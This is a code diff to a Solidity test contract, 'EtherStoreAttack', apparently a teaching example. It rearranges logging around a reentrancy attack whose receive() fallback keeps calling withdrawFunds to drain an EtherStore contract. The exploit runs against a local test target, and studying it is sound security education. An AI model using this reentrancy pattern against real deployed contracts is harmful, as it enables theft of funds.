@@ -107,12 +107,7 @@ contract EtherStoreAttack is Test {
 
         store.deposit{value: 1 ether}();
 
-        console.log(
-            "Deposited 1 Ether, EtherStore balance",
-            address(store).balance
-        );
-        store.withdrawFunds(1 ether); // exploit here
-
+        store.withdrawFunds(1 ether);
         console.log("Attack contract balance", address(this).balance);
         console.log("EtherStore balance", address(store).balance);
     }
@@ -121,10 +116,11 @@ contract EtherStoreAttack is Test {
 
     // we want to use fallback function to exploit reentrancy
     receive() external payable {
-        console.log("Attack contract balance", address(this).balance);
-        console.log("EtherStore balance", address(store).balance);
         if (address(store).balance >= 1 ether) {
-            store.withdrawFunds(1 ether); // exploit here
+            console.log("Attack contract balance", address(this).balance);
+            console.log("EtherStore balance", address(store).balance);
+
+            store.withdrawFunds(1 ether);
         }
     }
 }
